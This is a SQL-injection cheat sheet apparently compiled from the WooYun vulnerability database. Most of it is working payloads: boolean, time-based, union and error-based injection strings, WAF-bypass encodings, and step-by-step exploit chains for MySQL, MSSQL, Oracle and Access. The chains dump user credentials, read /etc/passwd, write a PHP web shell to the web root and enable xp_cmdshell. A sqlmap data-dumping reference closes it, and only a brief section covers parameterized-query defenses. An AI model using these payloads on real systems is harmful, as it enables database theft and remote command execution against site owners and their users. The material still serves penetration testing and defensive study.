# Web Security - SQL Injection

> Source: WooYun vulnerability database (27,732 SQL-injection cases) | split from web-injection.md

## 1. SQL Injection

### 1.1 Nature of the Vulnerability

```
missing input validation -> dynamic SQL concatenation -> semantic-boundary breach -> database command executes
```

**Core formula**: SQL injection = blurred code/data boundary + user input promoted to executable SQL

### 1.2 Detection Methods

#### Identifying High-Risk Injection Points

| Vector type | Share | Typical scenario |
|---------|------|---------|
| Login box | 66% | Username/password concatenated directly |
| Search box | 64% | LIKE fuzzy matching |
| POST parameter | 60% | Form submission |
| HTTP header | 26% | UA/Referer/XFF |
| GET parameter | 24% | URL parameters |
| Cookie | 12% | Session-identifier handling |

**High-frequency parameter names**: `id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`; ASP.NET-specific: `__viewstate`, `__eventvalidation`

#### Quick-Detection Workflow

```
1. Single/double-quote test -> observe errors
2. Arithmetic: id=2-1 / id=1*1 -> observe equivalence
3. Boolean test: and 1=1 / and 1=2 -> compare response differences
4. Time delay: and sleep(5) -> observe the response time
5. Column probing by sort: order by N -> increment until it errors
```

#### Database Fingerprinting

| Database | Delay function | System table | Error signature |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | Cartesian-product delay | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Injection Techniques and Payloads

#### Boolean-Based Blind Injection

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Time-Based Blind Injection

```sql
-- MySQL (nested-delay practical technique)
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### Union Query

```sql
id=1 ORDER BY N--              -- probe the column count
id=-1 UNION SELECT 1,2,3,4,5--  -- find the echo position
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Error-Based Injection

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- the CHAR function bypasses character filters
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/Filter-Bypass Techniques

#### Inline Comments (most common)

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMS bypass example
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Encoding Bypass

```sql
-- hex: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URL double encoding: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### Case + Whitespace Substitution

```sql
UnIoN SeLeCt                    -- case obfuscation
UNION/**/SELECT/**/1,2,3        -- comments instead of spaces
UNION%09SELECT                  -- Tab instead of space
UNION%0ASELECT                  -- newline instead of space
```

#### Function Substitution

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> the character A
```

#### Logical-Equivalence Substitution

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- quote bypass
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Wide-Byte Injection (GBK encoding)

```
%bf%27 bypasses addslashes()   -- under GBK, the multi-byte char swallows the backslash
```

#### HTTP-Layer Bypass

```
Parameter pollution: id=1&id=2             -- duplicate-parameter confusion
Chunked transfer: Transfer-Encoding: chunked
X-Forwarded-For injection / cookie injection  -- unconventional injection points
```

### 1.5 Exploit Chains

#### Full MySQL Exploit Chain

```sql
-- 1.info -> 2.databases -> 3.tables -> 4.columns -> 5.data -> 6.files -> 7.shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### Full MSSQL Exploit Chain

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- command execution (requires sa privileges)
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracle Exploit Chain

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Access Blind-Injection Exploit Chain

```sql
-- no information_schema; get the source or guess table names
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- use NOT IN to enumerate multiple users
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 Defenses

```python
# parameterized query (preferred)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- Parameterized queries / prepared statements (preferred), stored procedures (second choice)
- Allowlist input validation + forced type-casting of numeric parameters
- Least-privilege DB + hidden error messages + WAF deployment

---


---

## Appendix: SQLMap Quick-Reference

```bash
# basic detection
sqlmap -u "http://t/p.php?id=1" --batch
# POST request
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie / HTTP-header injection
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# bypass the WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# data-extraction chain
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
